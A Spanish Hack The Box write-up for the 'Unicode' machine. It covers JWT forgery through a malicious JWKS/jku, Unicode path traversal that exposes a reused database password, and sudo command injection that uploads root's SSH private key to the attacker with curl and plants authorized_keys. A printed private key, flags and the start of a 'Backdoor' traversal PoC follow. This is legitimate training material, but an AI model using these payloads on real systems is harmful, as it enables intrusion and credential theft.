base64.urlsafe_b64encode(long_to_bytes(int(x))).decode() def generate_jwks(): json.dump({'keys': [{ 'kty': 'RSA', 'kid': 'hackthebox', 'use': 'sig', 'alg': 'RS256', 'e': int_to_b64(pubkey.e), 'n': int_to_b64(pubkey.n) }]}, open('jwks.json', 'w'), indent=2) def main(): generate_jwks() ip = sys.argv[1] jku = f'http://{ip}/jwks.json' token = jwt.encode({'user': 'asdf'}, privkey, algorithm='RS256', headers={'jku': jku}) print('[+] JWT token:', token) HTTPServer(('', 80), SimpleHTTPRequestHandler).serve_forever() if __name__ == '__main__': main()  Antes de ejecutar el script tenemos que generar las claves RSA. Para ello usamos openssl:\n$ openssl genrsa -out priv.key 1024 Generating RSA private key, 1024 bit long modulus .........................................................................................................................++++++ ...++++++ e is 65537 (0x10001) $ openssl rsa -in priv.key -pubout \u0026gt; pub.key writing RSA key  Para generar el JWKS, tenemos que extraer n y e de la clave pública (esto en Pyhton se hace con Crypto.PublicKey.RSA) y luego codificarlo en Base64. Luego, estos valores junto con otros datos se guardan en un documento JSON llamado jwks.json.\nEntonces, generamos el token JWT falso usando la clave privada y poniendo la URL de jwks.json como jku en la cabecera.\nSi ejecutamos el script, veremos el token JWT y se iniciará un servidor web en el puerto 80 para servir el archivo jwks.json:\n$ python3 jwks.py 10.10.17.44 [+] JWT token: eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9oYWNrbWVkaWEuaHRiL3N0YXRpYy8uLi9yZWRpcmVjdC8_dXJsPTEwLjEwLjE3LjQ0L2p3a3MuanNvbiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.OFeVvgtLOIp2u2Gd-LUrPFsTTCq3LvoDTRW98vZWuy2BfcKz4PuXoCIRKX2Rcbnnb6BDBX3UkL7FPa0XhIcw3Y_ASgEGJQWJdzjPWASwtFj_oTDKIlFz0HhgrvHPTM8Mn_t9D164vrPtHnk_w8rjzX5ZLQ5XnRDra8gusgqXK2s  Luego, podemos usar curl para ver si el token JWT es válido:\n$ curl hackmedia.htb/dashboard/ -H 'Cookie: auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly8xMC4xMC4xNy40NC9qd2tzLmpzb24ifQ.eyJ1c2VyIjoiYWRtaW4ifQ.ba9qYIw2E8ynYq1OPnZ4gDoSOtxpFZMivvgr8YqN7AXuPE1kw4mpEwYoNyPvoH3dAcnVRjkzytaQGvtYuYT8oXHZMrlZ3uN0p76e86p5Crr4tyYk1D4o8GT0KpCY6ABlcxChxonLGH5S3GqqnJ2wqrojoeThJ-CDrJFQM2ggSWI' jku validation failed  Y el servidor nos dice que el campo jku es inválido. Además, no recibimos ninguna petición en el registro del servidor Python. La máquina tiene que haber aplicado algún tipo de filtro.\nAquí podemos recordar que había una funcionalidad de redirección en la página web. Si la máquina solamente admite valores de jku que empiecen por http://hackmedia.htb, entonces esta validación se puede saltar fácilmente con la función de redirección (Open Redirect). Podemos cambiar el campo jku en el script así:\n+ jku = f'http://hackmedia.htb/redirect?url={ip}/jwks.json' - jku = f'http://{ip}/jwks.json'  Ejecutamos el script de nuevo:\n$ python3 jwks.py 10.10.17.44 [+] JWT token: eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9oYWNrbWVkaWEuaHRiL3JlZGlyZWN0Lz91cmw9MTAuMTAuMTcuNDQvandrcy5qc29uIn0.eyJ1c2VyIjoiYWRtaW4ifQ.cWE5m9Vb9f7PoReY7XjyfRhU-Jrv23yw8C3uum8mVezJCFPeLEBbf030EXrprcGjZjzH4x_I8P9v7NNjAHiVG8bm0JG7BEyE4wjUhtNVTnoiaHnpmbIxvZkZ4UIVmdO4rvVOQYCjIgD4gcoMi2dWF6Az1EbKI1pqJKZypxU4MwM  Y verificamos el token JWT:\n$ curl hackmedia.htb/dashboard/ -H 'Cookie: auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9oYWNrbWVkaWEuaHRiL3JlZGlyZWN0Lz91cmw9MTAuMTAuMTcuNDQvandrcy5qc29uIn0.eyJ1c2VyIjoiYWRtaW4ifQ.cWE5m9Vb9f7PoReY7XjyfRhU-Jrv23yw8C3uum8mVezJCFPeLEBbf030EXrprcGjZjzH4x_I8P9v7NNjAHiVG8bm0JG7BEyE4wjUhtNVTnoiaHnpmbIxvZkZ4UIVmdO4rvVOQYCjIgD4gcoMi2dWF6Az1EbKI1pqJKZypxU4MwM' jku validation failed  Y todavía sigue siendo inválido (y no se recibe petición). Vamos a comparar el valor legítimo de jku con el que estamos usando:\n http://hackmedia.htb/static/jwks.json: Válido http://hackmedia.htb/redirect/?url=10.10.17.44/jwks.json: Inválid0  Existe una opción más, y es usando una navegación de directorios para que el campo jku empiece por http://hackmedia.htb/static/ y acceder a /redirect/. Esto se refleja en la siguiente URL:\n http://hackmedia.htb/static/jwks.json: Valid http://hackmedia.htb/static/../redirect/?url=10.10.17.44/jwks.json: To try  Entonces, vamos a cambiar el jku en el script otra vez:\n+ jku = f'http://hackmedia.htb/static/../redirect?url={ip}/jwks.json' - jku = f'http://hackmedia.htb/redirect?url={ip}/jwks.json'  Ejecutamos otra vez el script:\n$ python3 jwks.py 10.10.17.44 [+] JWT token: eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9oYWNrbWVkaWEuaHRiL3N0YXRpYy8uLi9yZWRpcmVjdC8_dXJsPTEwLjEwLjE3LjQ0L2p3a3MuanNvbiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.OFeVvgtLOIp2u2Gd-LUrPFsTTCq3LvoDTRW98vZWuy2BfcKz4PuXoCIRKX2Rcbnnb6BDBX3UkL7FPa0XhIcw3Y_ASgEGJQWJdzjPWASwtFj_oTDKIlFz0HhgrvHPTM8Mn_t9D164vrPtHnk_w8rjzX5ZLQ5XnRDra8gusgqXK2s  Y ya no hay mensaje de error:\n$ curl hackmedia.htb/dashboard/ -H 'Cookie: auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9oYWNrbWVkaWEuaHRiL3N0YXRpYy8uLi9yZWRpcmVjdC8_dXJsPTEwLjEwLjE3LjQ0L2p3a3MuanNvbiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.OFeVvgtLOIp2u2Gd-LUrPFsTTCq3LvoDTRW98vZWuy2BfcKz4PuXoCIRKX2Rcbnnb6BDBX3UkL7FPa0XhIcw3Y_ASgEGJQWJdzjPWASwtFj_oTDKIlFz0HhgrvHPTM8Mn_t9D164vrPtHnk_w8rjzX5ZLQ5XnRDra8gusgqXK2s' \u0026lt;!doctype html\u0026gt; \u0026lt;html lang=\"en\"\u0026gt; \u0026lt;!-- ... --\u0026gt; \u0026lt;/html\u0026gt;  Por tanto, tenemos un token JWT falso que a ojos del servidor es válido. Además, tenemos una petición en el registro de nuestro servidor:\n$ python3 jwks.py 10.10.17.44 [+] JWT token: eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9oYWNrbWVkaWEuaHRiL3N0YXRpYy8uLi9yZWRpcmVjdC8_dXJsPTEwLjEwLjE3LjQ0L2p3a3MuanNvbiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.OFeVvgtLOIp2u2Gd-LUrPFsTTCq3LvoDTRW98vZWuy2BfcKz4PuXoCIRKX2Rcbnnb6BDBX3UkL7FPa0XhIcw3Y_ASgEGJQWJdzjPWASwtFj_oTDKIlFz0HhgrvHPTM8Mn_t9D164vrPtHnk_w8rjzX5ZLQ5XnRDra8gusgqXK2s 10.10.11.126 - - [] \"GET /jwks.json HTTP/1.1\" 200 -  Ahora podemos crear un token JWT falso para el usuario admin. Y esto nos lleva a un dashboard diferente:\nNótese que el servidor de Python tiene que seguir en ejecución para que el archivo jwks.json esté accesible y que la máquina pueda validar el token JWT.\nExplotación de Directory Path Traversal En este dashboard vemos una función para descargar archivos PDF (aunque parece que no está terminada):\nLos archivos válidos son: monthly.pdf y quarterly.pdf.\nEn este punto, podemos tratar un payload típico de Directory Path Traversal para ver si el servidor es vulnerable (esto es, usar múltiples ../ y luego un archivo como /etc/passwd):\nComo se puede ver, el servidor bloquea nuestra petición. Y también dice que aplica algunos filtros, desafiándonos a burlarlos.\nDespués de probar payloads de HackTricks y PayloadsAllTheThings sin resultados interesantes, podemos pensar en caracteres UTF-8 (ya que la máquina se llama Unicode).\nDe hecho, existe una técnica de bypassing en Flask que utiliza un solo carácter Unicode que visualmente se parece a .. o / (por ejemplo: ‥, ︰ or ／), y Flask los interpreta como dos puntos y una barra. Más información aquí.\nPodemos verificar fácilmente que el servidor está corriendo Flask mirando el mensaje de estado de la respuesta HTTP. Si está en letras mayúsculas, es probable que estemos ante una aplicación Flask:\n$ curl hackmedia.htb -I HTTP/1.1 308 PERMANENT REDIRECT Server: nginx/1.18.0 (Ubuntu) Date: Content-Type: text/html; charset=utf-8 Content-Length: 260 Connection: keep-alive Location: http://hackmedia.htb/login/  Ahora que sabemos que la aplicación es Flask, podemos usar los caracteres Unicode de antes para obtener /etc/passwd:\nLa página web es vulnerable a Directory Path Traversal. Decidí añadir este exploit al script de Python anterior (con los caracteres Unicode). El script esdpt-jwks.py (explicación detallada aquí).\nCon este script, podemos leer archivos del servidor de manera sencilla:\n$ python3 dpt-jwks.py 10.10.17.44 [+] JWT token: eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9oYWNrbWVkaWEuaHRiL3N0YXRpYy8uLi9yZWRpcmVjdC8_dXJsPTEwLjEwLjE3LjQ0L2p3a3MuanNvbiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.OFeVvgtLOIp2u2Gd-LUrPFsTTCq3LvoDTRW98vZWuy2BfcKz4PuXoCIRKX2Rcbnnb6BDBX3UkL7FPa0XhIcw3Y_ASgEGJQWJdzjPWASwtFj_oTDKIlFz0HhgrvHPTM8Mn_t9D164vrPtHnk_w8rjzX5ZLQ5XnRDra8gusgqXK2s [+] Vulnerable page: http://hackmedia.htb/display/?page=%E2%80%A5/%E2%80%A5/%E2%80%A5/%E2%80%A5/etc/passwd dpt\u0026gt; /etc/hosts 127.0.0.1 localhost 127.0.1.1 code 127.0.0.1 hackmedia.htb # The following lines are desirable for IPv6 capable hosts ::1 ip6-localhost ip6-loopback fe00::0 ip6-localnet ff00::0 ip6-mcastprefix ff02::1 ip6-allnodes ff02::2 ip6-allrouters  Como el servidor usa nginx (mostrado en la salida de nmap), podemos tratar de ver la configuración de los sitios web:\ndpt\u0026gt; /etc/nginx/sites-enabled/default  limit_req_zone $binary_remote_addr zone=mylimit:10m rate=800r/s; server{ # Change the Webroot from /home/code/app/ to /var/www/html/ # Change the user password from db.yaml listen 80; error_page 503 /rate-limited/; location / { limit_req zone=mylimit; proxy_pass http://localhost:8000; include /etc/nginx/proxy_params; proxy_redirect off; } location /static/ { alias /home/code/coder/static/styles/; } }  Aquí hay algunas cosas interesantes:\n \u0026ldquo;Change the Webroot from /home/code/app/ to /var/www/html/\u0026rdquo; \u0026ldquo;Change the user password from db.yaml\u0026rdquo;  Tenemos que encontrar la ruta absoluta al archivo db.yaml porque podría contener credenciales en texto claro. Con esta información, podemos probar las siguientes rutas:\n /home/code/db.yaml /home/code/app/db.yaml /var/www/html/db.yaml /home/code/coder/static/styles/db.yaml /home/code/coder/static/db.yaml /home/code/coder/db.yaml  Y la última es la correcta:\ndpt\u0026gt; /home/code/coder/db.yaml  mysql_host: \"localhost\" mysql_user: \"code\" mysql_password: \"B3stC0d3r2021@@!\" mysql_db: \"user\"  Además, también podemos conseguir la flag user.txt:\ndpt\u0026gt; /home/code/user.txt eb2b21ad20f6b9239746d35881f4e023  Enumeración del sistema La contraseña encontrada en el archivo db.yaml se reutiliza para SSH:\n$ ssh code@10.10.11.126 code@10.10.11.126's password: code@code:~$  El usuario code puede usar sudo para ejecutar /usr/bin/treport como root sin contraseña (aunque la conocemos):\ncode@code:~$ sudo -l Matching Defaults entries for code on code: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User code may run the following commands on code: (root) NOPASSWD: /usr/bin/treport  Este archivo es un binario compilado:\ncode@code:~$ file /usr/bin/treport /usr/bin/treport: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=f6af5bc244c001328c174a6abf855d682aa7401b, for GNU/Linux 2.6.32, stripped  El programa nos permite crear, leer y descargar reportes de amenazas:\ncode@code:~$ sudo /usr/bin/treport 1.Create Threat Report. 2.Read Threat Report. 3.Download A Threat Report. 4.Quit. Enter your choice:  Si interactuamos con el programa y forzamos la salida (^C), veremos un KeyboardInterrupt:\ncode@code:~$ sudo /usr/bin/treport 1.Create Threat Report. 2.Read Threat Report. 3.Download A Threat Report. 4.Quit. Enter your choice:^CTraceback (most recent call last): File \"treport.py\", line 67, in \u0026lt;module\u0026gt; KeyboardInterrupt [2177] Failed to execute script 'treport' due to unhandled exception!  Esta es una excepción común en scripts de Python. Y esto nos dice que treport es un binario compilado con Python. Además, hay una referencia a un archivo treport.py.\nIngeniería inversa sobre treport Para transferir el binario treport a nuestra máquina de atacante, se puede abrir un servidor web en la máquina víctima con Python y descargar el binario con wget o curl.\nPara extraer el byte-code (.pyc), podemos usar PyInstaller Extractor. Luego, con el byte-code podemos obtener el script de Python original con uncompyle6 (pip3 install uncompyle6).\nEstas herramientas necesitan Python versión 3.8. Para prevenir problemas, esta tarea se puede realizar en un contenedor de Docker:\n$ wget -q https://raw.githubusercontent.com/extremecoders-re/pyinstxtractor/master/pyinstxtractor.py $ docker run --rm -v \"$PWD\"/:/htb -it python:3.8 bash root@28075f8d8030:/# cd htb root@28075f8d8030:/htb# pip3 install uncompyle6 ... root@28075f8d8030:/htb# python3 pyinstxtractor.py treport [+] Processing treport [+] Pyinstaller version: 2.1+ [+] Python version: 38 [+] Length of package: 6798297 bytes [+] Found 46 files in CArchive [+] Beginning extraction...please standby [+] Possible entry point: pyiboot01_bootstrap.pyc [+] Possible entry point: pyi_rth_pkgutil.pyc [+] Possible entry point: pyi_rth_multiprocessing.pyc [+] Possible entry point: pyi_rth_inspect.pyc [+] Possible entry point: treport.pyc [+] Found 223 files in PYZ archive [+] Successfully extracted pyinstaller archive: treport You can now use a python decompiler on the pyc files within the extracted directory root@28075f8d8030:/htb# uncompyle6 treport_extracted/treport.pyc \u0026gt; treport.py  Y ahora somos capaces de leer el código fuente en Python y analizarlo:\nimport os, re, sys from datetime import datetime class threat_report: def create(self): file_name = input('Enter the filename:') content = input('Enter the report:') if '../' in file_name: print('NOT ALLOWED') sys.exit(0) file_path = '/root/reports/' + file_name with open(file_path, 'w') as (fd): fd.write(content) def list_files(self): file_list = os.listdir('/root/reports/') files_in_dir = ' '.join([str(elem) for elem in file_list]) print('ALL THE THREAT REPORTS:') print(files_in_dir) def read_file(self): file_name = input('\\nEnter the filename:') if '../' in file_name: print('NOT ALLOWED') sys.exit(0) contents = '' file_name = '/root/reports/' + file_name try: with open(file_name, 'r') as (fd): contents = fd.read() except: print('SOMETHING IS WRONG') else: print(contents) def download(self): now = datetime.now() current_time = now.strftime('%H_%M_%S') command_injection_list = ['`', ';', '\u0026amp;', '|', '\u0026gt;', '\u0026lt;', '?', \"'\", '@', '#', '$', '%', '^', '(', ')'] ip = input('Enter the IP/file_name:') res = bool(re.search('\\\\s', ip)) if res: print('INVALID IP') sys.exit(0) if 'file' in ip or 'gopher' in ip or 'mysql' in ip: print('INVALID URL') sys.exit(0) for vars in command_injection_list: if vars in ip: print('NOT ALLOWED') sys.exit(0) cmd = '/bin/bash -c \"curl ' + ip + ' -o /root/reports/threat_report_' + current_time + '\"' os.system(cmd) if __name__ == '__main__': obj = threat_report() print('1.Create Threat Report.') print('2.Read Threat Report.') print('3.Download A Threat Report.') print('4.Quit.') check = True if check: choice = input('Enter your choice:') try: choice = int(choice) except: print('Wrong Input') sys.exit(0) else: if choice == 1: obj.create() elif choice == 2: obj.list_files() obj.read_file() elif choice == 3: obj.download() elif choice == 4: check = False else: print('Wrong input.')  Si leemos los cuatro métodos existentes:\n list_files no parece vulnerable read_file parece que tiene un buen filtro para ../ create también parece tener un buen filtro para ../ download tiene una lista de caracteres no permitidos, pero también tiene un comando de sistema en el que se concatenan datos de entrada de usuario  Claramente, el método más vulnerable es download. Vamos a echar un vistazo a los caracteres no permitidos:\n['`', ';', '\u0026amp;', '|', '\u0026gt;', '\u0026lt;', '?', \"'\", '@', '#', '$', '%', '^', '(', ')']  De hecho, quizás es más fácil si miramos qué caracteres podemos utilizar (sin contar letras y números):\n['{', '}', ',', '.', '[', ']', '-', '+', ':', '\"', '/', '*']  Nótese que no podemos usar espacios porque hay una expresión regular que busca cualquier espacio en blanco:\nres = bool(re.search('\\\\s', ip))  Vamos a ver qué podemos hacer con estos caracteres.\nEscalada de privilegios con sudo Como se mostró antes, el usuario code puede ejecutar /usr/bin/treport como root usando sudo. Por lo que todas las acciones que se ejecuten en este contexto se realizarán como root.\nEl programa treport utiliza curl para descargar reportes de amenazas. Lo podemos ver en el código fuente o poniendo 127.0.0.1:\ncode@code:~$ sudo /usr/bin/treport 1.Create Threat Report. 2.Read Threat Report. 3.Download A Threat Report. 4.Quit. Enter your choice:3 Enter the IP/file_name:127.0.0.1 % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 100 2078 100 2078 0 0 405k 0 --:--:-- --:--:-- --:--:-- 405k  Y se muestra la salida del comando curl. De hecho, podemos no introducir nada y ver un error de curl:\ncode@code:~$ sudo /usr/bin/treport 1.Create Threat Report. 2.Read Threat Report. 3.Download A Threat Report. 4.Quit. Enter your choice:3 Enter the IP/file_name: curl: no URL specified! curl: try 'curl --help' or 'curl --manual' for more information  Incluso podemos ver el panel de ayuda de curl:\ncode@code:~$ sudo /usr/bin/treport 1.Create Threat Report. 2.Read Threat Report. 3.Download A Threat Report. 4.Quit. Enter your choice:3 Enter the IP/file_name:--help Usage: curl [options...] \u0026lt;url\u0026gt; --abstract-unix-socket \u0026lt;path\u0026gt; Connect via abstract Unix domain socket --alt-svc \u0026lt;file name\u0026gt; Enable alt-svc with this cache file --anyauth Pick any authentication method -a, --append Append to target file when uploading --basic Use HTTP Basic Authentication --cacert \u0026lt;file\u0026gt; CA certificate to verify peer against --capath \u0026lt;dir\u0026gt; CA directory to verify peer against ...  Teniendo en cuenta que podemos utilizar {, } y ,, podemos utilizarlos como \u0026ldquo;espacios\u0026rdquo; porque así funciona en Bash.\nPor ejemplo, este comando:\n$ curl {10.10.17.44,-T,/root/.ssh/id_rsa} -o /root/reports/threat_report_HH_MM_SS  Es equivalente a:\n$ curl 10.10.17.44 -T /root/.ssh/id_rsa -o /root/reports/threat_report_HH_MM_SS  Con este payload, podemos transferir la clave privada SSH de root a nuestra máquina (-T se usa en curl para subir el contenido de un archivo con una petición PUT). Para ello, usamos nc para escuchar en el puerto 80 (HTTP) y ponemos el payload en treport:\ncode@code:~$ sudo /usr/bin/treport 1.Create Threat Report. 2.Read Threat Report. 3.Download A Threat Report. 4.Quit. Enter your choice:3 Enter the IP/file_name:{10.10.17.44,-T,/root/.ssh/id_rsa} % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 100 2590 0 0 100 2590 0 1257 0:00:02 0:00:02 --:--:-- 1257  $ nc -nlvp 80 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::80 Ncat: Listening on 0.0.0.0:80 Ncat: Connection from 10.10.11.126. Ncat: Connection from 10.10.11.126:33912. PUT /id_rsa HTTP/1.1 Host: 10.10.17.44 User-Agent: curl/7.68.0 Accept: */* Content-Length: 2590 Expect: 100-continue -----BEGIN OPENSSH PRIVATE KEY----- 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 a5BI6W1lTZzjUAAAAJcm9vdEBjb2RlAQI= -----END OPENSSH PRIVATE KEY-----  Sin embargo, esta clave privada de SSH no funciona. Se podría transferir la flag root.txt de la misma manera.\nSi queremos una shell como root, tenemos dos opciones ya que podemos escribir archivos mediante curl (permisos de escritura como root):\n Modificar el archivo /etc/passwd para cambiar la contraseña de root Subir una clave pública de SSH en /root/.ssh/authorized_keys  Este vez, elegiré la seguida opción. Para ello, tenemos que generar un par de claves SSH y exponer la pública con un servidor web:\n$ ssh-keygen Generating public/private rsa key pair. Enter file in which to save the key (~/.ssh/id_rsa): ./id_rsa Enter passphrase (empty for no passphrase): Enter same passphrase again: Your identification has been saved in ./id_rsa Your public key has been saved in ./id_rsa.pub The key fingerprint is: SHA256:i1sUXxdZ0+4pw/Y7Tv0KW/DwqgFdCCZhJTmpJ32a6Pk The key's randomart image is: +---[RSA 3072]----+ | ==+ .+o| | .++ . . ..o| | o .. . o .. | | o o .+ o . .| | + +S o + ..| | . oo o X .o| | . .. o . o B..| | o o . =.o.| | .E ..o o++| +----[SHA256]-----+ $ python -m http.server 80 Serving HTTP on :: port 80 (http://[::]:80/) ...  Luego, con treport podemos pedir la clave pública (id_rsa.pub) y guardarla en /root/.ssh/authorized_keys:\ncode@code:~$ sudo /usr/bin/treport 1.Create Threat Report. 2.Read Threat Report. 3.Download A Threat Report. 4.Quit. Enter your choice:3 Enter the IP/file_name:{10.10.17.44/id_rsa.pub,-o,/root/.ssh/authorized_keys} % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 100 553 100 553 0 0 2323 0 --:--:-- --:--:-- --:--:-- 2323  Finalmente, tenemos acceso como root mediante nuestra clave privada (id_rsa) y sin contraseña:\n$ ssh -i id_rsa root@10.10.11.126 root@code:~# cat root.txt 3eb081061035fcd241f3e389d991f146  ","image":"/images/HTB/Unicode/Unicode.png","permalink":"https://7rocky.github.io/htb/unicode/","section":"htb","summary":"Hack The Box. Linux. Máquina media. Esta máquina utiliza tokens JWT con JWKS y JKU que pueden ser falsificados para llegar a una vulnerabilidad de navegación de directorios que puede ser explotada mediante caracteres Unicode. Después, existe un binario compilado con Python que puede ejecutarse con sudo y usa curl por detrás. Para comprometer esta máquina se necesitan conocimientos sobre JWT y técnicas de bypassing para navegación de directorios e inyección de comandos. En este write-up se utiliza un script en Python para explotar la navegación de directorios usando JWT y JWKS","time":11,"title":"Unicode"},{"contents":"  SO: Linux   Dificultad: Fácil   Dirección IP: 10.10.11.125   Fecha: 20 / 11 / 2021   Escaneo de puertos # Nmap 7.92 scan initiated as: nmap -sC -sV -o nmap/targeted 10.10.11.125 -p 22,80,1337 Nmap scan report for 10.10.11.125 Host is up (0.33s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 b4:de:43:38:46:57:db:4c:21:3b:69:f3:db:3c:62:88 (RSA) | 256 aa:c9:fc:21:0f:3e:f4:ec:6b:35:70:26:22:53:ef:66 (ECDSA) |_ 256 d2:8b:e4:ec:07:61:aa:ca:f8:ec:1c:f8:8c:c1:f6:e1 (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-generator: WordPress 5.8.1 |_http-title: Backdoor \u0026#8211; Real-Life |_http-server-header: Apache/2.4.41 (Ubuntu) 1337/tcp open waste? Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done -- 1 IP address (1 host up) scanned in 44.66 seconds  La máquina tiene abiertos los puertos 22 (SSH), 80 (HTTP) y 1337.\nEnumeración Si vamos a http://10.10.11.125, veremos una página web de Wordpress como la siguiente. Si tratamos de navegar, el servidor nos redirigirá a http://backdoor.htb, por lo que tenemos que incluir backdoor.htb en /etc/hosts.\nVemos que hay un artículo por defecto del usuario admin:\nEnumeración de Wordpress Además, podemos enumerar los plugins utilizados en /wp-content/plugins (ya que existe una vulnerabilidad de listado de directorios):\nEl plugin llamado eBook Download es vulnerable a navegación de directorios, como se muestra en la salida de searchsploit:\n$ searchsploit wordpress ebook download ----------------------------------------------------------- ----------------------- Exploit Title | Path ----------------------------------------------------------- ----------------------- WordPress Plugin eBook Download 1.1 - Directory Traversal | php/webapps/39575.txt ----------------------------------------------------------- ----------------------- Shellcodes: No Results $ cat 39575.txt # Exploit Title: Wordpress eBook Download 1.1 | Directory Traversal # Exploit Author: Wadeek # Website Author: https://github.com/Wad-Deek # Software Link: https://downloads.wordpress.org/plugin/ebook-download.zip # Version: 1.1 # Tested on: Xampp on Windows7 [Version Disclosure] ====================================== http://localhost/wordpress/wp-content/plugins/ebook-download/readme.txt ====================================== [PoC] ====================================== /wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../wp-config.php ======================================  Acceso a la máquina Con este plugin, somos capaces de leer archivos del servidor si el usuario a nivel de sistema (normalmente www-data) tiene permisos suficientes.\nExplotación de Directory Path Traversal 